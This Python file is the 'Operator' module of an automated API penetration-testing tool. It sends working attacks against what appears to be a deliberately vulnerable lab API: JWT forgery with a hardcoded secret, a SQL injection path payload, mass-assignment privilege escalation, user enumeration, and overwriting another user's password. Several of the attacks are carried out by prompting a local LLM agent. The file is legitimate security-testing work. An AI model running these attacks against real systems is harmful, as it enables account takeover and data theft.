"""
Operator (attacker): "Runs the tool or module, captures the result and
writes the finding." Executes the Planner-ordered queue of attack modules
against the target and hands each resulting Finding to the state store as
it completes.

A module is either:
  - "deterministic": a plain function making a direct HTTP call -- the
    "insecure by design" checks that need no reasoning at all, or
  - "llm": a short ReAct agent (LangGraph + Ollama) mission driven through
    the same MCP `http_request` tool used by smoke_agent.py.

Every module's verdict is graded from the actual tool-call transcript or
HTTP response, never from the model's own prose summary -- a small local
model's own "it worked" claim is not proof (see _login()'s docstring for
one concrete way that goes wrong).
"""
from __future__ import annotations

import os
import re
import sys
import time
from pathlib import Path
from typing import Optional

import httpx
import jwt

from core import state_store as store

ROOT = Path(__file__).resolve().parent.parent
TOOL = ROOT / "tools" / "http_server.py"
RECURSION_LIMIT = 25


# --------------------------------------------------------------------- utils

def _status_ok(content: str) -> bool:
    return re.search(r'status_code["\']?\s*:\s*200', content) is not None


def _login(base: str, username: str, password: str) -> Optional[str]:
    """Deterministic login (no LLM): small local models are unreliable at
    copying a ~150-character JWT verbatim across several tool-call turns,
    and LangGraph can dispatch several tool calls from one model turn
    *concurrently*, which can race a dependent verification request against
    Flask's single-threaded dev server. Fetching tokens (and verifying
    impact) in plain Python keeps the interesting part -- deciding to
    attack another user's resource -- in the agent's hands, without the
    token itself, or the race, passing through the model."""
    try:
        with httpx.Client(timeout=10) as client:
            r = client.post(f"{base}/users/v1/login", json={"username": username, "password": password})
            return r.json().get("auth_token")
    except Exception:
        return None


def _pick_victim_book(base: str) -> tuple[Optional[str], Optional[str]]:
    """Deterministic recon: read the unauthenticated /books/v1 listing and
    pick a book owned by someone other than name2, so the BOLA-on-books
    module has a concrete target instead of open-ended discovery."""
    try:
        with httpx.Client(timeout=10) as client:
            r = client.get(f"{base}/books/v1")
            data = r.json()
        for book in data.get("Books", []):
            if book.get("user") != "name2" and book.get("book_title"):
                return book["book_title"], book["user"]
    except Exception:
        pass
    return None, None


def _extract_tool_calls(messages) -> list[dict]:
    """Pair each ToolMessage with the args of the AIMessage tool_call that
    produced it, so a check() can look at exactly which request produced
    which response instead of grepping one big blob of transcript text."""
    args_by_id: dict[str, dict] = {}
    for m in messages:
        for call in getattr(m, "tool_calls", None) or []:
            args_by_id[call["id"]] = call.get("args", {})
    records = []
    for m in messages:
        if type(m).__name__ == "ToolMessage":
            records.append({
                "args": args_by_id.get(getattr(m, "tool_call_id", None), {}),
                "content": str(m.content),
            })
    return records


def _find(records, url_substr, method=None):
    out = []
    for r in records:
        url = str(r["args"].get("url", ""))
        if url_substr in url and (method is None or str(r["args"].get("method", "")).upper() == method.upper()):
            out.append(r)
    return out


async def build_agent(model: str):
    from langchain_mcp_adapters.client import MultiServerMCPClient
    from langchain_ollama import ChatOllama
    from langgraph.prebuilt import create_react_agent

    # OLLAMA_BASE_URL lets this run unmodified whether Ollama is on the
    # same machine (default) or, when this process is dockerized, on the
    # host reachable via host.docker.internal -- see gui/README/Dockerfile.
    base_url = os.environ.get("OLLAMA_BASE_URL", "http://localhost:11434")
    client = MultiServerMCPClient({
        "http": {"command": sys.executable, "args": [str(TOOL)], "transport": "stdio"}
    })
    tools = await client.get_tools()
    return create_react_agent(ChatOllama(model=model, base_url=base_url, temperature=0), tools)


# ------------------------------------------------------------- check funcs
# Deterministic modules take (records, base, ctx) for a uniform call
# signature with LLM modules, but ignore `records`/`ctx` -- they make their
# own HTTP call directly.

def check_debug(records, base, ctx):
    with httpx.Client(timeout=10) as client:
        r = client.get(f"{base}/users/v1/_debug")
    ok = r.status_code == 200 and re.search(r'"password"\s*:\s*"[^"]+"', r.text) is not None
    return ok, r.text[:300]


def check_book_listing(records, base, ctx):
    with httpx.Client(timeout=10) as client:
        r = client.get(f"{base}/books/v1")
    ok = r.status_code == 200 and '"book_title"' in r.text
    return ok, r.text[:300]


def check_forged_jwt(records, base, ctx):
    forged = jwt.encode({"sub": "admin"}, "random", algorithm="HS256")
    if isinstance(forged, bytes):
        forged = forged.decode()
    with httpx.Client(timeout=10) as client:
        r = client.get(f"{base}/me", headers={"Authorization": f"Bearer {forged}"})
    ok = r.status_code == 200 and re.search(r'"admin"\s*:\s*true', r.text, re.I) is not None
    return ok, r.text[:300]


def check_mass_assignment(records, base, ctx):
    reg = _find(records, "/register", "POST")
    if not reg or ctx["username"] not in str(reg[-1]["args"].get("json_body", "")):
        return None, "agent never sent the malicious register call with admin:true"
    token = _login(base, ctx["username"], ctx["password"])
    if not token:
        return None, "attacker account was registered but could not log back in to verify"
    with httpx.Client(timeout=10) as client:
        r = client.get(f"{base}/me", headers={"Authorization": f"Bearer {token}"})
    ok = r.status_code == 200 and re.search(r'"admin"\s*:\s*true', r.text, re.I) is not None
    return ok, r.text[:400]


def check_user_enumeration(records, base, ctx):
    hits = _find(records, "/login", "POST")
    if len(hits) < 2:
        return None, f"agent made only {len(hits)} login attempt(s); need >= 2 to compare error phrasing"
    bodies = [h["content"] for h in hits]
    has_user_missing = any(re.search(r'does not exist', b, re.I) for b in bodies)
    has_pw_wrong = any(re.search(r'not correct', b, re.I) for b in bodies)
    if has_user_missing and has_pw_wrong:
        return True, "distinct error messages let an attacker tell 'unknown user' apart from 'wrong password': " + " | ".join(bodies)[:400]
    if all(re.search(r'incorrect', b, re.I) for b in bodies):
        return False, "server returned the same generic message both times: " + " | ".join(bodies)[:400]
    return None, "could not classify: " + " | ".join(bodies)[:400]


def check_sqli(records, base, ctx):
    candidates = [
        r for r in records
        if "/users/v1/" in str(r["args"].get("url", ""))
        and not re.search(r'/users/v1/?$|_debug|register|login', str(r["args"].get("url", "")))
    ]
    injectionish = [r for r in candidates if re.search(r"(=|'|OR|--)", str(r["args"].get("url", "")), re.I)]
    if not injectionish:
        return None, "agent never sent a SQL-injection-style username payload"
    for r in injectionish:
        if _status_ok(r["content"]) and re.search(r'username', r["content"], re.I):
            return True, r["content"][:400]
    return False, "injection payload never returned user data: " + injectionish[-1]["content"][:300]


def check_bola_password(records, base, ctx):
    put_hits = _find(records, "/password", "PUT")
    if not put_hits:
        return None, "agent never attempted PUT .../{username}/password on another user"
    put_headers = str(put_hits[-1]["args"].get("headers", ""))
    if not re.search(r'Bearer\s+eyJ', put_headers):
        return None, f"agent's PUT never carried a real bearer token, headers were: {put_headers[:200]}"
    with httpx.Client(timeout=10) as client:
        r = client.post(f"{base}/users/v1/login", json={"username": "name2", "password": "hacked123"})
    ok = r.status_code == 200 and "auth_token" in r.text
    return ok, f"PUT headers: {put_headers[:200]} | verify login: {r.text[:300]}"


def check_bola_book(records, base, ctx):
    hits = _find(records, f"/books/v1/{ctx['victim_title']}", "GET")
    if not hits:
        return None, f"agent never fetched GET /books/v1/{ctx['victim_title']}"
    headers = str(hits[-1]["args"].get("headers", ""))
    if not re.search(r'Bearer\s+eyJ', headers):
        return None, f"agent's GET never carried a real bearer token, headers were: {headers[:200]}"
    body = hits[-1]["content"]
    ok = _status_ok(body) and "secret" in body.lower() and ctx["victim_owner"] in body
    return ok, body[:400]


# ---------------------------------------------------------------- setup fns
# Runtime setup for "llm" modules that need a token or a discovered target
# resource before the mission prompt can even be written. Returning None
# means the module can't run this round (e.g. no victim book found).

def _setup_mass_assignment(base):
    return {"username": f"atk_massassign_{int(time.time())}", "password": "Passw0rd!"}


def _setup_bola_password(base):
    token = _login(base, "name1", "pass1")
    return {"token1": token} if token else None


def _setup_bola_book(base):
    title, owner = _pick_victim_book(base)
    token2 = _login(base, "name2", "pass2")
    if title and token2:
        return {"victim_title": title, "victim_owner": owner, "token2": token2}
    return None


# ------------------------------------------------------------------ prompts

def _prompt_mass_assignment(base, ctx):
    return f"""Target API base URL: {base}

Use the http_request tool to send:
POST {base}/users/v1/register with JSON body
{{"username": "{ctx['username']}", "password": "{ctx['password']}", "email": "atk@evil.com", "admin": true}}

This registers a normal-looking account but smuggles in an "admin": true field that a legitimate
registration form would never send. Report the response body."""


def _prompt_user_enumeration(base, ctx):
    return f"""Target API base URL: {base}

Use the http_request tool to send these two requests and report both response bodies verbatim:
1. POST {base}/users/v1/login with JSON body {{"username": "definitely_not_a_real_user_zzz9", "password": "whatever"}}
2. POST {base}/users/v1/login with JSON body {{"username": "admin", "password": "wrongpass123"}}"""


def _prompt_sqli(base, ctx):
    return f"""Target API base URL: {base}

Use the http_request tool to send:
1. GET {base}/users/v1/zzz_nonexistent_user9999
2. GET {base}/users/v1/' OR '1'='1
   (send that literal apostrophe-containing string as the path segment, do not remove the quotes)

Report the status code and body of both. Does request 2 return real user data even though the
username in request 1 does not exist?"""


def _prompt_bola_password(base, ctx):
    tok = ctx["token1"]
    return f"""Target API base URL: {base}

You are already authenticated as user "name1" with this bearer token: {tok}

Use the http_request tool to send:
PUT {base}/users/v1/name2/password -- deliberately targeting name2's account while you are
authenticated as name1. Set the headers argument to exactly
{{"Authorization": "Bearer {tok}"}}
and the json_body argument to {{"password": "hacked123"}}.

Report the response body and the exact headers argument you used."""


def _prompt_bola_book(base, ctx):
    t, tok = ctx["victim_title"], ctx["token2"]
    return f"""Target API base URL: {base}

You are already authenticated as user "name2" with this bearer token: {tok}

The book titled "{t}" was NOT created by name2. Use the http_request tool to send:
1. GET {base}/books/v1/{t} with headers argument set to exactly {{"Authorization": "Bearer {tok}"}}

Report the response body, including the "owner" field, and the exact headers argument you used."""


# --------------------------------------------------------------- catalog

MODULES: list[dict] = [
    dict(id="debug-exposure", title="Unauthenticated debug endpoint leaks plaintext passwords",
         owasp="API3:2023 Broken Object Property Level Authorization", kind="deterministic",
         requires=["/users/v1/_debug"], run=check_debug),
    dict(id="unauth-book-listing", title="Book list (with owners) is readable with no Authorization header",
         owasp="API5:2023 Broken Function Level Authorization", kind="deterministic",
         requires=["/books/v1"], run=check_book_listing),
    dict(id="forged-jwt", title="Hardcoded JWT secret lets an attacker forge an admin token with zero credentials",
         owasp="API2:2023 Broken Authentication", kind="deterministic",
         requires=["/me"], run=check_forged_jwt),
    dict(id="mass-assignment", title="Privilege escalation via mass-assignment on registration",
         owasp="API6:2023 Unrestricted Access to Sensitive Business Flows", kind="llm",
         requires=["/users/v1/register", "/me"], setup=_setup_mass_assignment,
         prompt=_prompt_mass_assignment, check=check_mass_assignment),
    dict(id="user-enumeration", title="Username/password enumeration via login error messages",
         owasp="API2:2023 Broken Authentication", kind="llm",
         requires=["/users/v1/login"], setup=lambda base: {},
         prompt=_prompt_user_enumeration, check=check_user_enumeration),
    dict(id="sql-injection", title="SQL injection in the username path parameter",
         owasp="API8:2023 Security Misconfiguration / Injection", kind="llm",
         requires=["/users/v1/{username}"], setup=lambda base: {},
         prompt=_prompt_sqli, check=check_sqli),
    dict(id="bola-book", title="Broken Object Level Authorization: read another user's secret book",
         owasp="API1:2023 Broken Object Level Authorization", kind="llm",
         requires=["/books/v1/{book_title}"], setup=_setup_bola_book,
         prompt=_prompt_bola_book, check=check_bola_book),
    # mutates=True: this module changes name2's password as a side effect,
    # which breaks any later module that needs to log in as name2 with the
    # seeded password (bola-book above did exactly that until this was
    # ordered last -- see planner.plan()'s sort key). Flagging it here
    # instead of just placing it last means a module added later that also
    # mutates shared account state gets the same treatment automatically.
    dict(id="bola-password", title="Broken Object Level Authorization: overwrite another user's password",
         owasp="API1:2023 Broken Object Level Authorization", kind="llm", mutates=True,
         requires=["/users/v1/{username}/password"], setup=_setup_bola_password,
         prompt=_prompt_bola_password, check=check_bola_password),
]


def _label(verdict: Optional[bool]) -> str:
    return {True: "VULNERABLE", False: "defended", None: "inconclusive"}[verdict]


# --------------------------------------------------------------- execution

async def run_queue(base: str, queue: list[dict], model: str, round_id: int) -> list[dict]:
    """Execute a Planner-ordered queue of modules. Each Finding is written
    to the state store the moment its module finishes, so the GUI sees
    them appear one at a time instead of all at the end."""
    findings = []
    agent = None
    if any(m["kind"] == "llm" for m in queue):
        store.log_event("operator", f"spinning up ReAct agent ({model} via Ollama, MCP tool = tools/http_server.py)", round_id)
        agent = await build_agent(model)

    for module in queue:
        store.log_event("operator", f"running module: {module['title']}", round_id, data={"module": module["id"]})
        try:
            if module["kind"] == "deterministic":
                verdict, evidence = module["run"](None, base, {})
            else:
                ctx = module["setup"](base)
                if ctx is None:
                    verdict, evidence = None, "module setup failed (could not obtain a token or find a target resource)"
                else:
                    prompt = module["prompt"](base, ctx)
                    result = await agent.ainvoke(
                        {"messages": [("user", prompt)]},
                        config={"recursion_limit": RECURSION_LIMIT},
                    )
                    records = _extract_tool_calls(result["messages"])
                    for rec in records:
                        store.log_event(
                            "operator",
                            f"tool call: {rec['args'].get('method', '?')} {rec['args'].get('url', '?')}",
                            round_id, data=rec,
                        )
                    verdict, evidence = module["check"](records, base, ctx)
        except Exception as exc:
            verdict, evidence = None, f"module run failed: {exc}"

        finding = {
            "id": store.finding_id(base, module["id"]), "module_id": module["id"],
            "target": base.rstrip("/"), "title": module["title"], "owasp": module["owasp"],
            "kind": module["kind"], "verdict": verdict, "evidence": evidence,
        }
        store.upsert_finding(finding, round_id)
        store.log_event(
            "operator", f"module '{module['id']}' verdict: {_label(verdict)}", round_id,
            data={"verdict": verdict, "evidence": (evidence or "")[:300]},
        )
        findings.append(finding)

    return findings
